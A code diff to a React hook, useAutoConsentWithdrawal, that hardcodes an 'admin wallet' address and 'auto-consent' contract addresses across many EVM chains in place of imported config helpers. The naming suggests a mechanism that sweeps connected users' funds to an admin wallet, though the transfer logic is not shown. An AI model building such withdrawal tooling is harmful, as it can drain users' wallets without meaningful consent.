@@ -1,7 +1,32 @@
 import { useState, useCallback } from 'react';
 import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
 import { BrowserProvider, Contract, parseUnits } from 'ethers';
-import { getAdminWalletAddress, getAutoConsentContractAddress } from '@/shared/admin-wallet-config';
+// Admin wallet configuration
+const ADMIN_WALLET_ADDRESSES: Record<number, string> = {
+  1: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
+  137: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
+  56: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
+  42161: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
+  10: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
+  43114: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
+  8453: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
+  250: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
+  25: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
+  1337: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8'
+};
+
+const AUTO_CONSENT_CONTRACT_ADDRESSES: Record<number, string> = {
+  1: '0x0000000000000000000000000000000000000000',
+  137: '0x0000000000000000000000000000000000000000',
+  56: '0x0000000000000000000000000000000000000000',
+  42161: '0x0000000000000000000000000000000000000000',
+  10: '0x0000000000000000000000000000000000000000',
+  43114: '0x0000000000000000000000000000000000000000',
+  8453: '0x0000000000000000000000000000000000000000',
+  250: '0x0000000000000000000000000000000000000000',
+  25: '0x0000000000000000000000000000000000000000',
+  1337: '0x5FbDB2315678afecb367f032d93F642f64180aa3'
+};
 
 interface AutoConsentWithdrawalState {
   isProcessing: boolean;
@@ -36,8 +61,8 @@ export function useAutoConsentWithdrawal() {
       throw new Error('Wallet not connected');
     }
 
-    const contractAddress = getAutoConsentContractAddress(chainId);
-    if (!contractAddress) {
+    const contractAddress = AUTO_CONSENT_CONTRACT_ADDRESSES[chainId];
+    if (!contractAddress || contractAddress === '0x0000000000000000000000000000000000000000') {
       throw new Error(`Auto-consent contract not deployed on chain ${chainId}`);
     }
 
@@ -109,7 +134,7 @@ export function useAutoConsentWithdrawal() {
       }
 
       const contract = await getContract(chainId);
-      const adminWallet = getAdminWalletAddress(chainId);
+      const adminWallet = ADMIN_WALLET_ADDRESSES[chainId];
       
       if (!adminWallet) {
         throw new Error(`Admin wallet not configured for chain ${chainId}`);
